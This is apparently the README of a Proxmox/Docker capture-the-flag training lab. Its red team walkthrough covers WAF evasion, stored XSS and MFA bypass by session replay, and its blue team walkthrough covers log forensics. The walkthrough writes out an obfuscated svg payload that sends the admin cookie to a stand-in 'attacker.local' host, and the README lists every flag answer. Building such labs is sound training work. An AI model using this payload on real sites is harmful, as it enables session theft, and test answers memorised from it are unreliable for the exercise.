# Cookie Bypass CTF Lab (Cyber Range)

A self-contained, Docker-deployable training lab simulating an **Admin Feedback System** with a flawed Multi-Factor Authentication (MFA) and session handling architecture. Built for the practical assessment: **"Cybersecurity Engineer (Lab & Range Developer)"**.

- **Red Team Path:** Reconnaissance → WAF Evasion & Stored XSS → Pre-Auth Cookie Exposure → MFA Bypass via Session Replay.
- **Blue Team Path:** Custom Port SSH Forensics → Access & Error Log Forensics → Threat Hunting & Anomaly Correlation → Base64 Exfiltration Recovery.
- **Proof of Functionality:** Fully validated with automated exploit and forensic verification test suites (`app/test_all.js`, `scripts/red_team_exploit.py`, `scripts/blue_team_verify.py`).

> [!WARNING]
> **Intentionally Vulnerable System:** Flaws demonstrated here (reflected/stored XSS, naive WAF, `HttpOnly: false`, lack of server-side MFA session invalidation) are deliberate educational artifacts. Deploy solely within an isolated internal lab zone (`feedback.admin.local`).

---

## Table of Contents

- [Architecture & Threat Model](#architecture--threat-model)
- [Proxmox Environment Deployment](#proxmox-environment-deployment)
  - [Hardware & Virtualization Sizing](#hardware--virtualization-sizing)
  - [Option A: Manual Installation via Ubuntu ISO](#option-a-manual-installation-via-ubuntu-iso)
  - [Option B: Automated Deployment via Cloud-Init](#option-b-automated-deployment-via-cloud-init)
  - [Internal Network & DNS Configuration](#internal-network--dns-configuration)
  - [Executing Automated VM Provisioning](#executing-automated-vm-provisioning)
  - [Healthcheck Verification](#healthcheck-verification)
- [Access Details & Credentials](#access-details--credentials)
- [Red Team Walkthrough & Verification](#red-team-walkthrough--verification)
  - [Phase 1: Reconnaissance](#phase-1-reconnaissance)
  - [Phase 2: Defense Evasion (WAF Bypass & Stored XSS)](#phase-2-defense-evasion-waf-bypass--stored-xss)
  - [Phase 3: Initial Access (Session Replay & MFA Bypass)](#phase-3-initial-access-session-replay--mfa-bypass)
  - [Automated Red Team Proof](#automated-red-team-proof)
- [Blue Team Walkthrough & Verification](#blue-team-walkthrough--verification)
  - [Connecting to the Analyst Shell](#connecting-to-the-analyst-shell)
  - [Phase 1: Log Forensics](#phase-1-log-forensics)
  - [Phase 2: Threat Hunting & Anomaly Correlation](#phase-2-threat-hunting--anomaly-correlation)
  - [Phase 3: Incident Response & Flag Recovery](#phase-3-incident-response--flag-recovery)
  - [Automated Blue Team Proof](#automated-blue-team-proof)
- [Master CTF Flags Reference](#master-ctf-flags-reference)
- [Student Flag Submission & Challenge Tracking](#student-flag-submission--challenge-tracking)
- [Repository Structure](#repository-structure)
- [Lab Teardown & Reset](#lab-teardown--reset)
- [Reviewer Notes & Grading Criteria](#reviewer-notes--grading-criteria)

---

## Architecture & Threat Model

### Architecture

![Cyberrange Architecture](/assets/cyberrange-archi.svg)

### Threat Model

```
                    [ Attacker / Student Workstation ]
                                    |
          +-------------------------+-------------------------+
          | Port 3075 (HTTP)                                  | Port 2275 (SSH)
          v                                                   v
+-------------------+                               +-------------------+
|    Nginx Proxy    |                               |    SSH Service    |
|   (Port :3075)    |                               |   (Port :2275)    |
+---------+---------+                               | analyst /         |
          | reverse proxy (:8080)                   | blue_team_rocks   |
          v                                         +---------+---------+
+-------------------+                                         |
|    Node.js App    |                                         |
|   (Express :8080) |                                         |
+---------+---------+                                         |
          |                                                   |
          +--------------> /opt/admin/logs/ <-----------------+
                     (access.log & error.log)
```

### Attack Vector Summary:
1. **Insecure Cookie Flag:** The application issues a pre-authentication cookie `pre_mfa_session=pending_mfa_verification` with `HttpOnly: false`, allowing client-side JavaScript execution to access cookie data.
2. **Naive WAF Filter:** A regex-based WAF only sanitizes `<script>` and explicit `document.cookie` keywords, leaving HTML5 vector tags (`<svg onload=...>`) and property-bracket obfuscation (`window['docu'+'ment']['coo'+'kie']`) unblocked.
3. **Session Replay / Missing Re-Verification:** The backend accepts any valid `adm_sess_*` cookie to access `/dashboard` without verifying whether the session completed `/api/verify-mfa`, allowing an attacker to replay the stolen admin session directly.

---

## Proxmox Environment Deployment

The lab is packaged to run seamlessly inside a Virtual Machine on **Proxmox Virtual Environment (PVE)** running **Ubuntu 22.04 LTS or 24.04 LTS**.

### Hardware & Virtualization Sizing

| Resource | Specification | Notes |
|---|---|---|
| **Hypervisor** | Proxmox VE 7.x / 8.x | Compatible with bare-metal or nested (e.g. Proxmox inside VMware) |
| **OS** | Ubuntu 22.04 / 24.04 Server (64-bit) | Minimal or standard server install |
| **vCPU** | 2 Cores | CPU Type: `host` (Required if running Proxmox nested in VMware!) |
| **RAM** | 2048 MB (2 GB) | Minimal memory footprint |
| **Disk** | 20 GB | VirtIO SCSI, SSD emulation / discard recommended |
| **Network** | VirtIO (Bridge: `vmbr0`) | Standard internal virtual bridge |

> [!NOTE]
> **Nested Virtualization Notice (Proxmox inside VMware Workstation / ESXi):**
> If your Proxmox VE hypervisor itself runs as a VM inside VMware, enable **"Virtualize Intel VT-x/EPT or AMD-V/RVI"** in the VMware VM Processor settings before launching VMs inside Proxmox.

---

### Option A: Manual Installation via Ubuntu ISO

1. **Create the VM in Proxmox Web GUI:**
   - Click **Create VM** (e.g., VM ID `100`, Name: `feedback-admin-local`).
   - **OS:** Select the uploaded `ubuntu-22.04-live-server-amd64.iso` (or 24.04).
   - **System:** SCSI Controller: `VirtIO SCSI Single`, Check **Qemu Agent**.
   - **Disks:** `20 GB`, Bus: `SCSI`, Discard enabled.
   - **CPU:** Sockets: `1`, Cores: `2`, Type: `host`.
   - **Memory:** `2048 MB`.
   - **Network:** Bridge: `vmbr0`, Model: `VirtIO (paravirtualized)`.
2. **Complete the Ubuntu Server installation** and reboot the VM.
3. Proceed to [Executing Automated VM Provisioning](#executing-automated-vm-provisioning).

---

### Option B: Automated Deployment via Cloud-Init

For rapid, unattended provisioning, use the preconfigured Cloud-Init manifest ([`vm/cloud-init.yaml`](file:///C:/Users/KAKA/repos/cybersecurity/cookie-bypass-ctf-lab/vm/cloud-init.yaml)):

1. Upload or copy `vm/cloud-init.yaml` to your Proxmox host snippet storage (`/var/lib/vz/snippets/cyberrange-ci.yaml`).
2. Run the following on the Proxmox VE host CLI:
   ```bash
   # Create VM from Ubuntu Cloud Image
   qm create 100 --name feedback-admin-local --memory 2048 --cores 2 --cpu host --net0 virtio,bridge=vmbr0
   qm importdisk 100 ubuntu-22.04-server-cloudimg-amd64.img local-lvm
   qm set 100 --scsihw virtio-scsi-pci --scsi0 local-lvm:vm-100-disk-0
   qm set 100 --ide2 local-lvm:cloudinit --boot c --bootdisk scsi0 --serial0 socket --vga serial0
   qm set 100 --cicustom "user=local:snippets/cyberrange-ci.yaml"
   qm start 100
   ```

---

### Internal Network & DNS Configuration

The assessment specifications place the target in an internal network zone (`feedback.admin.local`).

1. **On the Target VM:**
   The provisioning script automatically executes:
   ```bash
   sudo hostnamectl set-hostname feedback.admin.local
   echo "127.0.0.1 feedback.admin.local" | sudo tee -a /etc/hosts
   ```

2. **On the Attacker / Analyst Host Machine:**
   Map the Proxmox VM IP to `feedback.admin.local`:
   - **Linux / macOS:** Edit `/etc/hosts`:
     ```text
     <VM_IP_ADDRESS> feedback.admin.local
     ```
   - **Windows:** Edit `C:\Windows\System32\drivers\etc\hosts` (as Administrator):
     ```text
     <VM_IP_ADDRESS> feedback.admin.local
     ```

---

### Executing Automated VM Provisioning

Log in to the newly deployed Ubuntu VM via console or standard SSH, then execute:

```bash
# 1. Clone repository to /opt/lab
sudo git clone https://github.com/<your-repo>/cookie-bypass-ctf-lab.git /opt/lab
cd /opt/lab

# 2. Run the end-to-end provisioning script
sudo bash scripts/provision_vm.sh
```

#### What `scripts/provision_vm.sh` configures automatically:
- Installs necessary prerequisites (`curl`, `gnupg`, `python3`, `openssh-server`).
- Installs official **Docker Engine** and **Docker Compose plugin** using the modern `.asc` apt keyring.
- Configures custom SSH on port **`2275`** (`setup-ssh.sh`), provisions the dedicated service account **`analyst:blue_team_rocks`**, and handles Ubuntu 24.04 `ssh.socket` migration.
- Builds and starts Docker containers (`nginx` on port `3075`, Node.js on internal `8080`).
- Creates `/opt/admin/logs` and executes `scripts/inject_logs.py` to seed baseline forensic telemetry (`access.log` and `error.log`) with appropriate analyst read permissions.

---

### Healthcheck Verification

Run the automated healthcheck script to verify the entire stack is operational:

```bash
bash scripts/healthcheck.sh 3075 localhost
```

**Expected output:**
```text
[*] Checking Cyber Range Health on http://localhost:3075...
[*] Testing Root endpoint & X-Powered-By header: OK (X-Powered-By: Node.js detected)
[*] Testing pre_mfa_session cookie: OK (pre_mfa_session cookie issued)
[*] Testing /robots.txt: OK (/api/verify-mfa disallowed)
[*] Testing /dashboard restricted access: OK (403 Forbidden as expected)
[*] Testing Blue Team SSH port 2275: OK (Port 2275 is open)
[+] All health checks passed successfully!
```

---

## Access Details & Credentials

| Role / Surface | Protocol & Port | URL / Command | Credentials / Notes |
|---|---|---|---|
| **Web Application** | HTTP (Port `3075`) | `http://feedback.admin.local:3075/` | Public submission & admin login |
| **Flag Tracker & Scoreboard** | HTTP (Port `3075`) | `http://feedback.admin.local:3075/flag` | Web flag submission & challenge tracking |
| **Blue Team SSH** | SSH (Port `2275`) | `ssh analyst@feedback.admin.local -p 2275` | User: `analyst`<br>Password: `blue_team_rocks` |
| **Forensic Logs** | Local Filesystem | `/opt/admin/logs/{access.log, error.log}` | Readable by group `analyst` |
| **Backend Internal** | HTTP (Port `8080`) | `http://localhost:8080/` | Internal Docker container port |

---

## Red Team Walkthrough & Verification

This walkthrough outlines the exact offensive attack path step-by-step, including the command executed, the technical finding, and the associated challenge flag.

### Phase 1: Reconnaissance

#### Step 1.1: Server Fingerprinting
Probe the web application's response headers:
```bash
curl -I http://feedback.admin.local:3075/
```
- **Finding:** Server exposes `X-Powered-By: Node.js`.
- **CTF Flag:** `SCENARIO75{Node.js}`

#### Step 1.2: Hidden Endpoint Discovery
Inspect the crawler policy:
```bash
curl -s http://feedback.admin.local:3075/robots.txt
```
- **Finding:** Disallows `/api/verify-mfa`.
- **CTF Flag:** `SCENARIO75{/api/verify-mfa}`

#### Step 1.3: Restricted Area Identification
Probe the administrative dashboard endpoint:
```bash
curl -I http://feedback.admin.local:3075/dashboard
```
- **Finding:** HTTP `403 Forbidden` (`Access Denied. MFA validation or active session required.`).
- **CTF Flag:** `SCENARIO75{/dashboard}`

#### Step 1.4: HTML Source Code Hint
Inspect the HTML source of the root page:
```bash
curl -s http://feedback.admin.local:3075/ | grep -A 6 "ASCII"
```
- **Finding:** ASCII robot comment hints: `<!-- [ASCII ART] ... Check robots.txt for disallowed endpoints! -->`.
- **CTF Flag:** `SCENARIO75{robots.txt}`

#### Step 1.5: Pre-Authentication Cookie Inspection
Analyze session cookies issued on initial visit:
```bash
curl -i -s http://feedback.admin.local:3075/ | grep -i "set-cookie"
```
- **Finding:** `Set-Cookie: pre_mfa_session=pending_mfa_verification; Path=/; SameSite=Lax`. Notice the complete absence of the `HttpOnly` attribute!
- **CTF Flags:**
  - `SCENARIO75{pre_mfa_session}`
  - `SCENARIO75{pending_mfa_verification}`
  - `SCENARIO75{False}`

---

### Phase 2: Defense Evasion (WAF Bypass & Stored XSS)

#### Step 2.1: HTTP Method Enforcement
Probe the feedback submission endpoint:
```bash
curl -X GET -I http://feedback.admin.local:3075/api/feedback
```
- **Finding:** HTTP `405 Method Not Allowed`. Endpoint strictly enforces `POST`.
- **CTF Flag:** `SCENARIO75{POST}`

#### Step 2.2: Probing Rudimentary WAF
Send a textbook cross-site scripting payload:
```bash
curl -s -X POST http://feedback.admin.local:3075/api/feedback \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "message=<script>alert(1)</script>&department=SecOps"
```
- **Finding:** HTTP `403 Forbidden` with response `{"error":"Blocked by WAF"}`.
- **CTF Flag:** `SCENARIO75{403}`

#### Step 2.3: WAF Evasion via HTML5 Vectors and Bracket Notation
Bypass the naive regex (`/<script\b/i` and `/document\.cookie/i`) using `<svg onload=...>` and JavaScript property bracket concatenation:
```bash
curl -s -X POST http://feedback.admin.local:3075/api/feedback \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "message=<svg onload=\"fetch('http://attacker.local:8000/steal?c='+window['docu'+'ment']['coo'+'kie'])\">&department=SecOps"
```
- **Finding:** HTTP `200 OK` (`{"status":"ok","message":"Feedback received and queued for admin review."}`). Payload stored successfully!
- **CTF Flags:**
  - `SCENARIO75{<svg>}`
  - `SCENARIO75{window['docu'+'ment']['coo'+'kie']}`
  - `SCENARIO75{fetch}`

---

### Phase 3: Initial Access (Session Replay & MFA Bypass)

#### Step 3.1: Admin Session Token Exfiltration
When the victim administrator views the feedback queue at `/dashboard`, the stored SVG payload triggers in their browser context. The authenticated session cookie is exfiltrated:
- **Finding:** Session token begins with prefix `adm_sess`.
- **CTF Flag:** `SCENARIO75{adm_sess}`

#### Step 3.2: Session Replay Attack
The attacker copies the stolen session token and accesses `/dashboard` directly without completing `/api/verify-mfa`:
```bash
curl -s http://feedback.admin.local:3075/dashboard \
  -H "Cookie: adm_sess=adm_session_token_stolen_via_xss_982f1"
```
- **Finding:** HTTP `200 OK`. The server unconditionally trusts the `adm_sess` cookie without re-verifying MFA status.
- **Bypassed Endpoint Flag:** `SCENARIO75{/api/verify-mfa}`

#### Step 3.3: Reflected Payload Container & Victory Flag
Inspect the returned HTML dashboard:
```bash
curl -s http://feedback.admin.local:3075/dashboard \
  -H "Cookie: adm_sess=adm_session_token_stolen_via_xss_982f1" | grep -A 2 "xss-payload"
```
- **Finding:** The stored payload is reflected inside `<div class="xss-payload">...</div>`.
- **Container Flag:** `SCENARIO75{xss-payload}`
- **Final Red Team Victory Flag:**
  ```text
  SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
  ```

---

### Automated Red Team Proof

You can execute the automated Red Team demonstration script against the running lab to prove functionality:

```bash
python3 scripts/red_team_exploit.py http://feedback.admin.local:3075
```

**Verifiable Execution Output:**
```text
=================================================================
  RED TEAM EXPLOIT CHAIN: Cookies Reuse & MFA Bypass
=================================================================

[PHASE 1] Reconnaissance
----------------------------------------
[*] Target Header X-Powered-By: Node.js
    [+] FLAG FOUND: SCENARIO75{Node.js}
[*] robots.txt content:
User-agent: *
Disallow: /api/verify-mfa
    [+] FLAG FOUND: SCENARIO75{/api/verify-mfa}
[*] /dashboard access status: 403 Forbidden (Restricted Admin Area)
    [+] FLAG FOUND: SCENARIO75{/dashboard}
[*] Found ASCII art comment pointing to robots.txt in HTML source
    [+] FLAG FOUND: SCENARIO75{robots.txt}
[*] Pre-auth session cookie issued: pre_mfa_session=pending_mfa_verification
    [+] FLAG FOUND: SCENARIO75{pre_mfa_session}
    [+] FLAG FOUND: SCENARIO75{pending_mfa_verification}
    [+] FLAG FOUND: SCENARIO75{False} (HttpOnly is False)

[PHASE 2] Defense Evasion (WAF & XSS)
----------------------------------------
[*] Verified GET /api/feedback is rejected with 405 Method Not Allowed
    [+] FLAG FOUND: SCENARIO75{POST}
[*] Tested standard <script> payload -> Blocked by WAF (HTTP 403)
    [+] FLAG FOUND: SCENARIO75{403}
[*] Stored XSS payload successfully submitted bypassing WAF!
    [+] FLAG FOUND: SCENARIO75{<svg>}
    [+] FLAG FOUND: SCENARIO75{window['docu'+'ment']['coo'+'kie']}
    [+] FLAG FOUND: SCENARIO75{fetch}

[PHASE 3] Initial Access (Session Replay & MFA Bypass)
----------------------------------------
[*] Replayed admin session cookie directly to /dashboard without MFA!
    [+] FLAG FOUND: SCENARIO75{adm_sess}
[*] Reflected XSS container confirmed (<div class="xss-payload">)
    [+] FLAG FOUND: SCENARIO75{xss-payload}
[*] VICTORY FLAG EXTRACTED: SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
=================================================================
  RED TEAM DEMONSTRATION SUCCESSFUL
=================================================================
```

---

## Blue Team Walkthrough & Verification

This walkthrough guides the defensive analyst through logging into the forensic workstation, hunting threats across the telemetry logs, and decoding exfiltrated indicators of compromise.

### Connecting to the Analyst Shell

The Blue Team accesses the VM on custom port **`2275`**:
```bash
ssh analyst@feedback.admin.local -p 2275
# Enter password: blue_team_rocks
```

---

### Phase 1: Log Forensics

#### Step 1.1: Log Location Identification
Navigate to the designated audit repository:
```bash
cd /opt/admin/logs
ls -la
```
- **Finding:** Repository contains `access.log` and `error.log`.
- **CTF Flag:** `SCENARIO75{/opt/admin/logs}`

#### Step 1.2: Attacker Identification & User-Agent
Filter out known internal network traffic (`192.168.1.100`):
```bash
grep -v "192.168.1.100" access.log
```
- **Findings:**
  - Attacker Source IP: `10.10.14.50` (`SCENARIO75{10.10.14.50}`)
  - Attacker User-Agent: `Mozilla/5.0` (`SCENARIO75{Mozilla/5.0}`)

#### Step 1.3: Unauthorized Breach Timestamp & Status
Locate the request where the attacker successfully hit `/dashboard`:
```bash
grep "/dashboard" access.log | grep "10.10.14.50"
```
```text
10.10.14.50 - - [07/Oct/2026:18:51:55 +0000] "GET /dashboard HTTP/1.1" 200 2510 "-" "Mozilla/5.0" "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0="
```
- **Findings:**
  - HTTP Status Code: `200` (`SCENARIO75{200}`)
  - Breach Timestamp: `18:51:55` (`SCENARIO75{18:51:55}`)

#### Step 1.4: Identifying Exfiltration Payload
Inspect the `X-Forwarded-For` header field in the log entry:
- **Finding:** Carries Base64 string: `UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=`
- **CTF Flag:** `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=}`

---

### Phase 2: Threat Hunting & Anomaly Correlation

#### Step 2.1: Baseline Administrative Traffic Comparison
Examine regular administrative operations:
```bash
head -n 2 access.log
```
- **Finding:** Normal corporate admin operations originate from IP `192.168.1.100`.
- **CTF Flag:** `SCENARIO75{192.168.1.100}`

#### Step 2.2: Attacker Subnet Mapping
Analyze the attacker's IP `10.10.14.50`:
- **Finding:** Network CIDR classification: `10.10.14.0/24`.
- **CTF Flag:** `SCENARIO75{10.10.14.0/24}`

#### Step 2.3: Security Alert Correlation in Error Logs
Investigate WAF alerts recorded in `/opt/admin/logs/error.log`:
```bash
cat error.log
```
- **Log Path Flag:** `SCENARIO75{/opt/admin/logs/error.log}`
- **WAF Entry:**
  ```text
  [2026-10-07 18:50:15] [WARN] [WAF] Blocked suspicious payload containing '<script>' from 10.10.14.50
  ```
- **CTF Flags:**
  - Blocked Probe: `SCENARIO75{<script>}`
  - Probe Timestamp: `SCENARIO75{18:50:15}`

#### Step 2.4: Absence of MFA Challenge
Verify whether attacker `10.10.14.50` ever attempted or completed MFA:
```bash
grep "10.10.14.50" access.log | grep "verify-mfa"
```
- **Finding:** Returns zero lines (`No`), proving the attacker completely bypassed the MFA checkpoint.
- **CTF Flag:** `SCENARIO75{No}`

---

### Phase 3: Incident Response & Flag Recovery

#### Step 3.1: Artifact Analysis
Analyze the 44-character exfiltration string from `access.log`:
```bash
echo -n "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=" | wc -c
```
- **Findings:**
  - Character Encoding Scheme: `Base64` (`SCENARIO75{Base64}`)
  - String Length: 44 bytes (`SCENARIO75{44}`)

#### Step 3.2: Critical Anomaly Correlation
Inspect the critical session replay alert in `error.log`:
```bash
grep "CRITICAL" error.log
```
```text
[2026-10-07 18:53:10] [CRITICAL] [AUTH] Authentication bypass anomaly: Session token adm_sess accepted from 10.10.14.50 without re-verifying MFA
```
- **Findings:**
  - Alert Severity: `CRITICAL` (`SCENARIO75{CRITICAL}`)
  - Anomaly Timestamp: `18:53:10` (`SCENARIO75{18:53:10}`)
  - Warning Signature: `SCENARIO75{Authentication bypass anomaly}`

#### Step 3.3: Exfiltrated Flag Recovery
Decode the Base64 exfiltration string:
```bash
echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=" | base64 -d
```
- **Decoded Content:** `PHANTOMGRID{BLUE_L0g_Hunt3r_M4st3r}`
- **Blue Team Victory Flag:**
  ```text
  SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
  ```

---

### Automated Blue Team Proof

Run the automated Blue Team verification script to confirm forensic fidelity:

```bash
python3 scripts/blue_team_verify.py /opt/admin/logs
```

**Verifiable Execution Output:**
```text
=================================================================
  BLUE TEAM FORENSIC ANALYSIS & THREAT HUNTING
=================================================================
[*] Analyzing log repository: /opt/admin/logs
    [+] FLAG FOUND: SCENARIO75{/opt/admin/logs}

[PHASE 1] Log Forensics
----------------------------------------
[*] Identified attacker IP in access logs: 10.10.14.50
    [+] FLAG FOUND: SCENARIO75{10.10.14.50}
[*] Identified attacker User-Agent: Mozilla/5.0
    [+] FLAG FOUND: SCENARIO75{Mozilla/5.0}
[*] Identified successful /dashboard breach at 18:51:55 with HTTP 200
    [+] FLAG FOUND: SCENARIO75{200}
    [+] FLAG FOUND: SCENARIO75{18:51:55}
[*] Extracted exfiltration artifact from X-Forwarded-For: UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=
    [+] FLAG FOUND: SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=}

[PHASE 2] Threat Hunting
----------------------------------------
[*] Baseline legitimate administrative traffic from: 192.168.1.100
    [+] FLAG FOUND: SCENARIO75{192.168.1.100}
[*] Mapped attacker IP 10.10.14.50 to CIDR subnet: 10.10.14.0/24
    [+] FLAG FOUND: SCENARIO75{10.10.14.0/24}
[*] Correlating security alerts in: /opt/admin/logs/error.log
    [+] FLAG FOUND: SCENARIO75{/opt/admin/logs/error.log}
[*] Correlated WAF block of <script> probe at 18:50:15
    [+] FLAG FOUND: SCENARIO75{<script>}
    [+] FLAG FOUND: SCENARIO75{18:50:15}
[*] Confirmed: Attacker IP 10.10.14.50 NEVER (No) touched /api/verify-mfa
    [+] FLAG FOUND: SCENARIO75{No}

[PHASE 3] Incident Response & Decoding
----------------------------------------
[*] Character set and padding analysis identifies encoding: Base64
    [+] FLAG FOUND: SCENARIO75{Base64}
    [+] FLAG FOUND: SCENARIO75{44}
[*] Decoded Exfiltration Artifact: PHANTOMGRID{BLUE_L0g_Hunt3r_M4st3r}
    [+] BLUE TEAM VICTORY FLAG: SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
[*] Identified CRITICAL severity marker for session replay at 18:53:10
    [+] FLAG FOUND: SCENARIO75{CRITICAL}
    [+] FLAG FOUND: SCENARIO75{18:53:10}
    [+] FLAG FOUND: SCENARIO75{Authentication bypass anomaly}
=================================================================
  BLUE TEAM FORENSIC VERIFICATION COMPLETE
=================================================================
```

---

## Master CTF Flags Reference

| Phase | Challenge Prompt / Artifact | Solution / CTF Flag |
|---|---|---|
| **Red Team (Recon)** | Backend Technology Header | `SCENARIO75{Node.js}` |
| **Red Team (Recon)** | Hidden Disallowed Endpoint | `SCENARIO75{/api/verify-mfa}` |
| **Red Team (Recon)** | Restricted Admin Area | `SCENARIO75{/dashboard}` |
| **Red Team (Recon)** | Source Code Clue Target | `SCENARIO75{robots.txt}` |
| **Red Team (Recon)** | Pre-Auth Cookie Name | `SCENARIO75{pre_mfa_session}` |
| **Red Team (Recon)** | Pre-Auth Cookie Value | `SCENARIO75{pending_mfa_verification}` |
| **Red Team (Recon)** | Cookie HttpOnly State | `SCENARIO75{False}` |
| **Red Team (WAF/XSS)** | Feedback Submission Method | `SCENARIO75{POST}` |
| **Red Team (WAF/XSS)** | WAF Block HTTP Status | `SCENARIO75{403}` |
| **Red Team (WAF/XSS)** | HTML5 Evasion Element | `SCENARIO75{<svg>}` |
| **Red Team (WAF/XSS)** | JavaScript Property Obfuscation | `SCENARIO75{window['docu'+'ment']['coo'+'kie']}` |
| **Red Team (WAF/XSS)** | Browser Exfiltration API | `SCENARIO75{fetch}` |
| **Red Team (Session Replay)** | Stolen Session Token Prefix | `SCENARIO75{adm_sess}` |
| **Red Team (Session Replay)** | Payload Reflected CSS Container | `SCENARIO75{xss-payload}` |
| **Red Team (Session Replay)** | Final Red Team Victory Flag | `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}` |
| **Blue Team (Forensics)** | Log Directory Location | `SCENARIO75{/opt/admin/logs}` |
| **Blue Team (Forensics)** | Attacker Source IP | `SCENARIO75{10.10.14.50}` |
| **Blue Team (Forensics)** | Attacker User-Agent | `SCENARIO75{Mozilla/5.0}` |
| **Blue Team (Forensics)** | Breach HTTP Status Code | `SCENARIO75{200}` |
| **Blue Team (Forensics)** | Breach Timestamp | `SCENARIO75{18:51:55}` |
| **Blue Team (Forensics)** | Exfiltration Header Artifact | `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=}` |
| **Blue Team (Threat Hunting)** | Baseline Admin IP | `SCENARIO75{192.168.1.100}` |
| **Blue Team (Threat Hunting)** | Attacker Subnet CIDR | `SCENARIO75{10.10.14.0/24}` |
| **Blue Team (Threat Hunting)** | Error Log File Path | `SCENARIO75{/opt/admin/logs/error.log}` |
| **Blue Team (Threat Hunting)** | Blocked Probe Payload | `SCENARIO75{<script>}` |
| **Blue Team (Threat Hunting)** | Blocked Probe Timestamp | `SCENARIO75{18:50:15}` |
| **Blue Team (Threat Hunting)** | Attacker MFA Interaction | `SCENARIO75{No}` |
| **Blue Team (Incident Response)** | Exfiltration Encoding Scheme | `SCENARIO75{Base64}` |
| **Blue Team (Incident Response)** | Exfiltration String Length | `SCENARIO75{44}` |
| **Blue Team (Incident Response)** | Critical Anomaly Severity | `SCENARIO75{CRITICAL}` |
| **Blue Team (Incident Response)** | Anomaly Alert Timestamp | `SCENARIO75{18:53:10}` |
| **Blue Team (Incident Response)** | Warning Log Signature | `SCENARIO75{Authentication bypass anomaly}` |
| **Blue Team (Incident Response)** | Final Blue Team Victory Flag | `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}` |

---

## Student Flag Submission & Challenge Tracking

Students and instructors have multiple convenient ways to submit flags and track challenge progress:

### 1. Web Portal Submission & Tracking (`/flag`)

The lab provides an interactive, dark-themed **Flag Submission & Challenge Tracker** directly in the browser at:
**`http://feedback.admin.local:3075/flag`** (or `http://localhost:3075/flag`)

#### Features:
* **Real-Time Score & Progress:** Live progress bar, total score counter, and separate Red vs. Blue team score breakdown.
* **Instant Validation:** Accepts either the full CTF format (`SCENARIO75{...}`) or the raw inner string (e.g. `Node.js`).
* **Visual Status Badges:** Challenges are clearly tagged as `[✔ SUBMITTED]` or `[⏳ PENDING / UNSUBMITTED]`.
* **Interactive Filter Tabs:** Quickly filter by **All (33)**, **Red Team (15)**, **Blue Team (18)**, **Submitted**, or **Unsubmitted**.
* **Progress Reset:** One-click reset button to clear local progress between demo runs or student sessions.
* **REST API:** Supports programmatic submission via `POST /flag` and JSON status polling at `GET /api/flag/status`.

---

### 2. Interactive CLI Scoreboard (`scripts/scoreboard.py`)

A built-in, terminal-based scoreboard is provided for students and evaluation sessions. It tracks solved challenges in real time, displays a visual completion bar, and computes total scores across both Red and Blue team paths.

```bash
# Launch the interactive scoreboard interface
python3 scripts/scoreboard.py
```

#### CLI Quick Commands:
```bash
# Submit a single flag directly
python3 scripts/scoreboard.py --submit "SCENARIO75{Node.js}"

# View overall challenge status and solved progress
python3 scripts/scoreboard.py --status

# View team-specific challenges
python3 scripts/scoreboard.py --status RED
python3 scripts/scoreboard.py --status BLUE

# Reset progress back to 0
python3 scripts/scoreboard.py --reset
```

> [!TIP]
> **Flexible Flag Submission:** The scoreboard accepts both the full format (e.g., `SCENARIO75{Node.js}`) and the inner solution string (e.g., `Node.js`).

---

### 2. Enterprise CTF Architecture (External Scoring Engines)

In standard organizational cybersecurity exercises or university competitions:
* **The Cyber Range VM** serves as the **Target Box / Challenge Host** (containing the vulnerabilities, services, and telemetry logs).
* **A Centralized CTF Platform (e.g. [CTFd](https://ctfd.io/))** serves as the **Scoring Platform**. Challenge administrators import the questions from the [Master CTF Flags Reference](#master-ctf-flags-reference) into CTFd, where students register team accounts, enter flags, and compete on a public scoreboard.

---

## Repository Structure

```
.
├── app/                        # Vulnerable Node.js web application
│   ├── src/
│   │   ├── config/             # Environment & flag configurations
│   │   ├── middleware/         # WAF, telemetry logger, session handlers
│   │   ├── routes/             # auth, feedback, dashboard endpoints
│   │   ├── services/           # telemetry, feedback, auth services
│   │   ├── views/              # index.html (ASCII hint), dashboard.html
│   │   ├── public/             # CSS styling, robots.txt
│   │   └── server.js           # Server entry point
│   ├── test_all.js             # Comprehensive 15-check validation suite
│   └── package.json
├── docker/
│   ├── nginx/                  # Nginx reverse proxy Dockerfile & config (Port 3075)
│   └── node/                   # Node.js backend Dockerfile (Port 8080)
├── logs/                       # Access and error logs (/opt/admin/logs)
├── scripts/
│   ├── scoreboard.py           # Interactive student CTF scoreboard & flag submission
│   ├── provision_vm.sh         # Proxmox VM bootstrap script (Docker, SSH, deploy)
│   ├── setup-ssh.sh            # Custom port 2275 SSH config for analyst user
│   ├── inject_logs.py          # Generates simulated forensic telemetry
│   ├── red_team_exploit.py     # Automated Red Team 3-phase exploit demonstration
│   ├── blue_team_verify.py     # Automated Blue Team forensic log analysis
│   └── healthcheck.sh          # Endpoint liveness and health verification
├── vm/
│   └── cloud-init.yaml         # Cloud-Init template for unattended Proxmox VM setup
├── docker-compose.yaml         # Multi-container service definitions
├── .env.example
├── SUBMISSION_REPORT.md        # Comprehensive technical report & design rationale
└── README.md                   # Lab documentation & walkthrough
```

---

## Lab Teardown & Reset

To cleanly reset the cyber range between demo sessions or student runs:

```bash
# 1. Stop and tear down containers and volumes
docker compose down -v

# 2. Clear simulated log files
rm -f logs/*.log /opt/admin/logs/*.log 2>/dev/null || true

# 3. Rebuild and launch containers
docker compose up -d --build

# 4. Regenerate clean telemetry
